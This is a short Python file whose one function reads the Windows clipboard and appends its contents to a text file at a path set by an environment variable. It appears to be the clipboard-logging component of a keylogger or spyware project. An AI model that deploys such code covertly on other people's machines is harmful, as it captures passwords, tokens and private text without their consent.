import win32clipboard
import os
from dotenv import load_dotenv
load_dotenv()  

file_path = os.getenv("FILE_PATH")
extend = "\\"
clipboard_information = "clipboard.txt"

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard cannot be copied\n")